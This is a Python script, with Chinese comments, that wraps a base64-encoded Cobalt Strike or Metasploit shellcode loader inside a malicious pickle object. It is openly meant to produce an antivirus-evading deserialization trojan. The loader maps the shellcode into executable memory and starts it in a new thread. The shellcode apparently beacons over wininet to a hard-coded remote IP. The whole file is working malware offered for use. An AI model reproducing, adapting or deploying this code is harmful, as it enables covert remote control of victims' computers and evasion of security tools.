import pickle,base64


# cd填入的值是由cs或者msf生成的playload.c里shellcode的base64的值
shellcode='''cd='/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuKAPAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L3dKNGgAlFtXtVkkWHXXbTv7n4tXRUhlnBKGEcJBT95FwsM0t8SKOt73OjNbP11p1s2ZtTubKZTRT0CCEW25QC8VBZQlpziF3BacuGad7ABVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC81LjA7IHlpZTkpDQoAvhW3CuErawRUr1lXLzmSgxI/Zqe2atqt1UAopoSZroA7twJ+xP7hqzG1AgYCW5e76qZipNxYAKEMTKwXp3f1L28LeOvvODR3wYq5V2CzYxgFJBrFpoSymk9QiiRDFVJvc/6tbabuuR9Mv1ELBBX3mrCmOpIqzJlJFR8oOA3wgdV9H1AMQoCm0VtauRVnmixOeesEqy4PWSjnjd3BnFNVNdmKPevV+aDiFe3WIJTA04eF4MVCEUJ0RQpGWPbGT+QKAcoopZrrS8/0o8KdeWPKBCuBA8oAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zQzLjEzOS4xNzkuMjE0ABdQZeo='
cd=base64.b64decode(cd)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(cd), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(cd), len(cd))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)'''

class s():
    def __reduce__(self):
        return (exec,(shellcode,))

# 输出的值是填入反序列化免杀木马里的s1_b64的值
s1=pickle.dumps(s())
s1_b64=base64.b64encode(s1)
print(s1_b64)